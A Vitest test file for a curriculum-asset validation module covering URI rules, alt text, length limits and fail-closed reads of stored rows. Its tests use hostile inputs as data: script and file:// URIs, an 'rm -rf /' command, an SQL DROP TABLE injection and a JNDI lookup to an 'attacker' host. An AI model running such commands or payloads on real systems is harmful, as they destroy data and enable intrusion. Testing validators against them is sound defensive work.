import { describe, expect, it } from "vitest";
import {
  CURRICULUM_ASSET_ACCESSIBILITY_NOTE,
  CURRICULUM_ASSET_ALT_TEXT_LIMIT,
  CURRICULUM_ASSET_STABLE_ID,
  CURRICULUM_ASSET_TITLE_LIMIT,
  CURRICULUM_ASSET_TYPES,
  CURRICULUM_AUTHORABLE_ASSET_TYPES,
  CURRICULUM_LEGACY_ASSET_TYPE_OWNERS,
  CURRICULUM_VISUAL_ASSET_TYPES,
  findUnresolvedAssetReferences,
  isAllowedCurriculumAssetUri,
  isAuthorableCurriculumAssetType,
  isCurriculumAssetType,
  isVisualCurriculumAsset,
  resolvePersistedCurriculumAssets,
  validateCurriculumAsset,
  type CurriculumAssetInput,
  type PersistedCurriculumAssetRow
} from "./curriculum-assets";
import {
  collectMissionStepAssetReferences,
  type MissionStep
} from "./mission-steps";

const validDiagram: CurriculumAssetInput = {
  missionId: "00000000-0000-4000-8000-0000000000d1",
  stableId: "two-host-topology",
  assetType: "diagram",
  title: "Two hosts on one switch",
  uri: "https://example.org/assets/two-host-topology.svg",
  position: 0,
  altText:
    "Two hosts attached to one switch, each holding an address in a different range."
};

const validArticle: CurriculumAssetInput = {
  missionId: validDiagram.missionId,
  stableId: "ipv4-notation-primer",
  assetType: "article",
  title: "IPv4 notation in one page",
  uri: "https://example.org/articles/ipv4",
  position: 1
};

/* ------------------------------------------------------------------ *
 * Vocabulary: storage compatibility versus new authoring
 * ------------------------------------------------------------------ */

describe("WP-D curriculum asset vocabulary", () => {
  it("preserves the Wave 2 storage vocabulary and adds the visual types", () => {
    expect([...CURRICULUM_ASSET_TYPES]).toEqual([
      "article",
      "video",
      "lab",
      "assessment",
      "reference",
      "download",
      "image",
      "diagram"
    ]);

    // Nothing was removed: narrowing a live column is a destructive migration.
    for (const legacy of [
      "article",
      "video",
      "lab",
      "assessment",
      "reference",
      "download"
    ]) {
      expect(isCurriculumAssetType(legacy), legacy).toBe(true);
    }
  });

  it("narrows what may be newly authored", () => {
    expect([...CURRICULUM_AUTHORABLE_ASSET_TYPES]).toEqual([
      "article",
      "reference",
      "download",
      "image",
      "diagram"
    ]);

    // Readable, not authorable. Each because another architecture owns it.
    for (const reserved of ["lab", "assessment", "video"]) {
      expect(isCurriculumAssetType(reserved), `${reserved} readable`).toBe(true);
      expect(
        isAuthorableCurriculumAssetType(reserved),
        `${reserved} not authorable`
      ).toBe(false);
      expect(CURRICULUM_LEGACY_ASSET_TYPE_OWNERS[reserved]).toBeTruthy();
    }
  });

  it("refuses a reserved type with the reason another architecture owns it", () => {
    const errors = validateCurriculumAsset({
      ...validArticle,
      assetType: "lab"
    });

    expect(errors.join(" ")).toContain("cannot be newly authored");
    expect(errors.join(" ")).toContain("Lab Engine");
  });

  it("rejects an unapproved type outright", () => {
    for (const rejected of ["screenshot", "html", "", null, 7]) {
      expect(isCurriculumAssetType(rejected)).toBe(false);
      expect(
        validateCurriculumAsset({
          ...validArticle,
          assetType: rejected as never
        }).length
      ).toBeGreaterThan(0);
    }
  });

  it("treats only image and diagram as visual", () => {
    expect([...CURRICULUM_VISUAL_ASSET_TYPES]).toEqual(["image", "diagram"]);
    expect(isVisualCurriculumAsset("diagram")).toBe(true);
    expect(isVisualCurriculumAsset("image")).toBe(true);
    for (const nonVisual of ["article", "reference", "download", "video"]) {
      expect(isVisualCurriculumAsset(nonVisual), nonVisual).toBe(false);
    }
  });
});

/* ------------------------------------------------------------------ *
 * Identity, resource location, authoring validation
 * ------------------------------------------------------------------ */

describe("WP-D curriculum asset authoring", () => {
  it("accepts a valid visual asset", () => {
    expect(validateCurriculumAsset(validDiagram)).toEqual([]);
  });

  it("accepts a valid non-visual asset without alt text", () => {
    expect(validateCurriculumAsset(validArticle)).toEqual([]);
  });

  it("uses the repository stable-id grammar", () => {
    for (const valid of ["two-host-topology", "net.topology", "a1_b2"]) {
      expect(CURRICULUM_ASSET_STABLE_ID.test(valid), valid).toBe(true);
    }
    for (const invalid of ["AB", "ab", "-leading", "has space", ""]) {
      expect(CURRICULUM_ASSET_STABLE_ID.test(invalid), invalid).toBe(false);
    }

    expect(
      validateCurriculumAsset({ ...validArticle, stableId: "AB" }).join(" ")
    ).toContain("stable id");
  });

  it("requires an asset to belong to a mission and carry an identity", () => {
    expect(
      validateCurriculumAsset({ ...validArticle, missionId: "" }).join(" ")
    ).toContain("must belong to a mission");
    expect(
      validateCurriculumAsset({ ...validArticle, stableId: "" }).join(" ")
    ).toContain("must carry a stable id");
  });

  it("allows only absolute http(s) resource locations", () => {
    for (const allowed of [
      "https://example.org/a.svg",
      "http://example.org/a.png"
    ]) {
      expect(isAllowedCurriculumAssetUri(allowed), allowed).toBe(true);
    }
    for (const rejected of [
      "javascript:alert(1)",
      "data:text/html,<script>1</script>",
      "file:///etc/passwd",
      "/relative/path",
      "example.org",
      ""
    ]) {
      expect(isAllowedCurriculumAssetUri(rejected), rejected).toBe(false);
    }
  });

  // Surrounding whitespace is a rejection, not something to tidy away.
  // Trimming before parsing would accept a value the author did not write.
  it("rejects a URL padded with whitespace rather than trimming it", () => {
    for (const padded of [
      " https://example.org/a.svg",
      "https://example.org/a.svg ",
      " https://example.org/a.svg ",
      "\thttps://example.org/a.svg",
      "https://example.org/a.svg\n"
    ]) {
      expect(isAllowedCurriculumAssetUri(padded), JSON.stringify(padded)).toBe(
        false
      );

      expect(
        validateCurriculumAsset({ ...validArticle, uri: padded }).join(" "),
        JSON.stringify(padded)
      ).toContain("absolute http or https URL");
    }

    // The unpadded form is still fine, so the rule rejects the padding rather
    // than the URL.
    expect(isAllowedCurriculumAssetUri("https://example.org/a.svg")).toBe(true);
  });

  it("rejects an authored title over the limit", () => {
    expect(
      validateCurriculumAsset({
        ...validArticle,
        title: "a".repeat(CURRICULUM_ASSET_TITLE_LIMIT + 1)
      }).join(" ")
    ).toContain("title exceeds");

    // Exactly at the limit is allowed, so the boundary is inclusive.
    expect(
      validateCurriculumAsset({
        ...validArticle,
        title: "a".repeat(CURRICULUM_ASSET_TITLE_LIMIT)
      })
    ).toEqual([]);
  });

  it("rejects a non-integer or negative position without repairing it", () => {
    for (const position of [-1, 1.5, "0" as unknown as number]) {
      expect(
        validateCurriculumAsset({ ...validArticle, position: position as number })
          .join(" "),
        String(position)
      ).toContain("position");
    }
  });
});

/* ------------------------------------------------------------------ *
 * Accessibility
 * ------------------------------------------------------------------ */

describe("WP-D curriculum asset accessibility", () => {
  it("refuses a visual asset with no authored alt text", () => {
    for (const altText of [undefined, "", "   "]) {
      expect(
        validateCurriculumAsset({ ...validDiagram, altText }).join(" "),
        String(altText)
      ).toContain("requires authored alt text");
    }
  });

  it("bounds alt text", () => {
    expect(
      validateCurriculumAsset({
        ...validDiagram,
        altText: "a".repeat(CURRICULUM_ASSET_ALT_TEXT_LIMIT + 1)
      }).join(" ")
    ).toContain("alt text exceeds");
  });

  it("documents the distinction from step-level textAlternative", () => {
    // Both exist and answer different questions. Recording that in the contract
    // is what stops a future reader treating one as a substitute for the other.
    expect(CURRICULUM_ASSET_ACCESSIBILITY_NOTE).toContain("depicts");
    expect(CURRICULUM_ASSET_ACCESSIBILITY_NOTE).toContain("teaches");
    expect(CURRICULUM_ASSET_ACCESSIBILITY_NOTE).toContain("authored");
  });

  it("carries no field through which AI could supply accessibility", () => {
    // Accessibility must work with the AI Gateway switched off, which it is.
    const keys = Object.keys(validDiagram);
    for (const forbidden of [
      "generateAltText",
      "aiAltText",
      "altTextSource",
      "autoDescribe",
      "model",
      "prompt"
    ]) {
      expect(keys).not.toContain(forbidden);
    }
  });
});

/* ------------------------------------------------------------------ *
 * Architectural boundaries
 * ------------------------------------------------------------------ */

describe("WP-D curriculum asset boundaries", () => {
  it("carries no competency, evidence, progress or prerequisite field", () => {
    const keys = Object.keys(validDiagram);
    for (const forbidden of [
      "competencyStableId",
      "competencyId",
      "evidence",
      "awards",
      "demonstrates",
      "progress",
      "state",
      "completedAt",
      "prerequisite",
      "prerequisites",
      "requires"
    ]) {
      expect(keys, `asset must not carry ${forbidden}`).not.toContain(forbidden);
    }
  });

  it("is not a curriculum node", () => {
    // A curriculum node carries publication state and a version. An asset
    // carries neither, which is what keeps publication inherited from the
    // mission and prevents a second publication hierarchy.
    const keys = Object.keys(validDiagram);
    for (const nodeField of [
      "publicationState",
      "publication_state",
      "version",
      "nodeType",
      "moduleId",
      "courseId",
      "learningPathId"
    ]) {
      expect(keys).not.toContain(nodeField);
    }
  });

  it("carries no executable or renderer-instruction field", () => {
    const keys = Object.keys(validDiagram);
    for (const forbidden of [
      "html",
      "rawHtml",
      "markup",
      "script",
      "component",
      "render",
      "template",
      "sql",
      "command"
    ]) {
      expect(keys).not.toContain(forbidden);
    }
  });

  it("accepts code-looking instructional text in authored fields", () => {
    // The platform teaches HTML, shell and security material. A validator that
    // rejected these would make it unable to teach its own subject matter.
    for (const text of [
      "<script>alert(1)</script>",
      "rm -rf / --no-preserve-root",
      "'; DROP TABLE missions; --",
      "${jndi:ldap://attacker/a}"
    ]) {
      expect(
        validateCurriculumAsset({
          ...validDiagram,
          title: text,
          altText: text
        }),
        text
      ).toEqual([]);
    }
  });
});

/* ------------------------------------------------------------------ *
 * The persistence boundary — fail closed, never coerce
 * ------------------------------------------------------------------ */

describe("WP-D persisted curriculum asset integrity", () => {
  const row = (
    overrides: Partial<PersistedCurriculumAssetRow> = {}
  ): PersistedCurriculumAssetRow => ({
    id: "00000000-0000-4000-8000-0000000000a1",
    missionId: validDiagram.missionId,
    stableId: "two-host-topology",
    assetType: "diagram",
    title: "Two hosts on one switch",
    uri: "https://example.org/a.svg",
    position: 0,
    required: true,
    altText: "Two hosts attached to one switch.",
    ...overrides
  });

  it("accepts well-formed rows", () => {
    const outcome = resolvePersistedCurriculumAssets([row()]);

    expect(outcome.state).toBe("available");
    if (outcome.state !== "available") throw new Error("expected available");
    expect(outcome.assets[0]!.stableId).toBe("two-host-topology");
    expect(outcome.assets[0]!.position).toBe(0);
    expect(outcome.assets[0]!.required).toBe(true);
  });

  it("treats a legacy row with no stable id as valid", () => {
    // Nothing has ever written one, but a restored older database must read.
    const outcome = resolvePersistedCurriculumAssets([
      row({ stableId: null, assetType: "article", altText: null })
    ]);

    expect(outcome.state).toBe("available");
    if (outcome.state !== "available") throw new Error("expected available");
    expect(outcome.assets[0]!.stableId).toBeUndefined();
  });

  it("reads a legacy lab or video row rather than failing", () => {
    // The READ vocabulary is the wide one; only authoring is narrowed.
    for (const legacy of ["lab", "assessment", "video"]) {
      const outcome = resolvePersistedCurriculumAssets([
        row({ assetType: legacy, altText: null })
      ]);
      expect(outcome.state, legacy).toBe("available");
    }
  });

  // The coercion cases. Each of these would silently become valid under
  // String()/Number()/Boolean(), turning corrupt storage into content that
  // looks authored.
  it("fails closed on a position that is not a real non-negative integer", () => {
    for (const position of ["1", -1, 1.5, null, undefined, true, "0"]) {
      const outcome = resolvePersistedCurriculumAssets([row({ position })]);
      expect(outcome.state, `position ${String(position)}`).toBe("content_error");
      if (outcome.state !== "content_error") throw new Error("expected error");
      expect(outcome.errors.join(" ")).toContain("position");
    }
  });

  it("fails closed on a required flag that is not a real boolean", () => {
    for (const required of ["false", "true", 0, 1, null, undefined]) {
      const outcome = resolvePersistedCurriculumAssets([row({ required })]);
      expect(outcome.state, `required ${String(required)}`).toBe("content_error");
      if (outcome.state !== "content_error") throw new Error("expected error");
      expect(outcome.errors.join(" ")).toContain("required flag");
    }
  });

  it("fails closed on a missing identity or mission association", () => {
    expect(resolvePersistedCurriculumAssets([row({ id: "" })]).state).toBe(
      "content_error"
    );
    expect(resolvePersistedCurriculumAssets([row({ id: null })]).state).toBe(
      "content_error"
    );
    expect(
      resolvePersistedCurriculumAssets([row({ missionId: "" })]).state
    ).toBe("content_error");
    expect(
      resolvePersistedCurriculumAssets([row({ missionId: 7 })]).state
    ).toBe("content_error");
  });

  it("fails closed on a malformed persisted stable id", () => {
    for (const stableId of ["AB", "has space", ""]) {
      expect(
        resolvePersistedCurriculumAssets([row({ stableId })]).state,
        stableId
      ).toBe("content_error");
    }
  });

  it("fails closed on an unapproved persisted asset type", () => {
    // The database CHECK normally prevents this. The read boundary does not
    // rely on a constraint it cannot see.
    for (const assetType of ["screenshot", "", null, 7]) {
      expect(
        resolvePersistedCurriculumAssets([row({ assetType })]).state,
        String(assetType)
      ).toBe("content_error");
    }
  });

  it("fails closed on a persisted visual asset with no alt text", () => {
    for (const altText of [null, undefined, "", "   "]) {
      const outcome = resolvePersistedCurriculumAssets([row({ altText })]);
      expect(outcome.state, String(altText)).toBe("content_error");
      if (outcome.state !== "content_error") throw new Error("expected error");
      expect(outcome.errors.join(" ")).toContain("alt text");
    }
  });

  it("fails closed on a persisted resource location that is not http(s)", () => {
    for (const uri of ["javascript:alert(1)", "/relative", "", null]) {
      expect(
        resolvePersistedCurriculumAssets([row({ uri })]).state,
        String(uri)
      ).toBe("content_error");
    }
  });

  // The persisted boundary must enforce the SAME limits the authoring contract
  // does. A row exceeding them did not come through validateCurriculumAsset,
  // and truncating it would silently alter authored content.
  it("fails closed on a persisted title over the limit", () => {
    const outcome = resolvePersistedCurriculumAssets([
      row({ title: "a".repeat(CURRICULUM_ASSET_TITLE_LIMIT + 1) })
    ]);

    expect(outcome.state).toBe("content_error");
    if (outcome.state !== "content_error") throw new Error("expected error");
    expect(outcome.errors.join(" ")).toContain("title exceeds");
  });

  it("fails closed on persisted visual alt text over the limit", () => {
    const outcome = resolvePersistedCurriculumAssets([
      row({ altText: "a".repeat(CURRICULUM_ASSET_ALT_TEXT_LIMIT + 1) })
    ]);

    expect(outcome.state).toBe("content_error");
    if (outcome.state !== "content_error") throw new Error("expected error");
    expect(outcome.errors.join(" ")).toContain("alt text exceeds");
  });

  it("fails closed on persisted non-visual alt text over the limit", () => {
    // A non-visual asset need not carry alt text, but if it does the limit
    // still applies — otherwise the wider column stays unbounded here.
    const outcome = resolvePersistedCurriculumAssets([
      row({
        assetType: "article",
        altText: "a".repeat(CURRICULUM_ASSET_ALT_TEXT_LIMIT + 1)
      })
    ]);

    expect(outcome.state).toBe("content_error");
    if (outcome.state !== "content_error") throw new Error("expected error");
    expect(outcome.errors.join(" ")).toContain("alt text exceeds");
  });

  it("accepts persisted values exactly at the limits", () => {
    const outcome = resolvePersistedCurriculumAssets([
      row({
        title: "a".repeat(CURRICULUM_ASSET_TITLE_LIMIT),
        altText: "b".repeat(CURRICULUM_ASSET_ALT_TEXT_LIMIT)
      })
    ]);

    expect(outcome.state).toBe("available");
  });

  it("fails closed on a persisted URL padded with whitespace", () => {
    for (const padded of [
      " https://example.org/a.svg",
      "https://example.org/a.svg ",
      " https://example.org/a.svg "
    ]) {
      const outcome = resolvePersistedCurriculumAssets([row({ uri: padded })]);
      expect(outcome.state, JSON.stringify(padded)).toBe("content_error");
    }
  });

  it("still accepts a persisted ordinary http(s) URL", () => {
    for (const uri of [
      "https://example.org/a.svg",
      "http://example.org/assets/topology.png"
    ]) {
      expect(
        resolvePersistedCurriculumAssets([row({ uri })]).state,
        uri
      ).toBe("available");
    }
  });

  it("fails the whole read when one row breaks a length limit", () => {
    const outcome = resolvePersistedCurriculumAssets([
      row({ stableId: "good-one" }),
      row({
        stableId: "too-long-title",
        title: "a".repeat(CURRICULUM_ASSET_TITLE_LIMIT + 1)
      }),
      row({ stableId: "another-good", assetType: "article", altText: null })
    ]);

    expect(outcome.state).toBe("content_error");
    expect(outcome).not.toHaveProperty("assets");
  });

  it("does not return the valid remainder when one row is corrupt", () => {
    const outcome = resolvePersistedCurriculumAssets([
      row({ stableId: "good-one" }),
      row({ stableId: "bad-one", position: "2" }),
      row({ stableId: "another-good", assetType: "article", altText: null })
    ]);

    expect(outcome.state).toBe("content_error");
    expect(outcome).not.toHaveProperty("assets");
  });

  it("returns an empty list for a mission with no assets", () => {
    const outcome = resolvePersistedCurriculumAssets([]);
    expect(outcome.state).toBe("available");
    if (outcome.state !== "available") throw new Error("expected available");
    expect(outcome.assets).toEqual([]);
  });
});

/* ------------------------------------------------------------------ *
 * WP-C integration — reference resolution
 * ------------------------------------------------------------------ */

describe("WP-D mission step asset references", () => {
  const step = (
    stableId: string,
    position: number,
    content: MissionStep["content"]
  ): MissionStep => ({ stableId, position, content });

  it("collects diagram and reference asset ids from steps", () => {
    const references = collectMissionStepAssetReferences([
      step("s01", 0, {
        type: "diagram",
        assetStableId: "two-host-topology",
        textAlternative: "Two hosts on one switch."
      }),
      step("s02", 1, {
        type: "reference",
        label: "Primer",
        assetStableId: "ipv4-notation-primer"
      }),
      step("s03", 2, {
        type: "concept",
        paragraphs: ["A network is a set of devices that can reach each other."]
      })
    ]);

    expect(references).toEqual(["ipv4-notation-primer", "two-host-topology"]);
  });

  it("ignores a reference step that names an external link instead", () => {
    const references = collectMissionStepAssetReferences([
      step("s01", 0, {
        type: "reference",
        label: "External",
        uri: "https://example.org/a"
      })
    ]);

    expect(references).toEqual([]);
  });

  it("reports references that resolve to no asset on the mission", () => {
    expect(
      findUnresolvedAssetReferences(
        ["two-host-topology", "missing-diagram"],
        ["two-host-topology"]
      )
    ).toEqual(["missing-diagram"]);
  });

  it("reports nothing when every reference resolves", () => {
    expect(
      findUnresolvedAssetReferences(
        ["two-host-topology"],
        ["two-host-topology", "unused-extra"]
      )
    ).toEqual([]);
  });

  it("deduplicates and sorts so the result is stable", () => {
    expect(
      findUnresolvedAssetReferences(["b-one", "a-one", "b-one"], [])
    ).toEqual(["a-one", "b-one"]);
  });
});
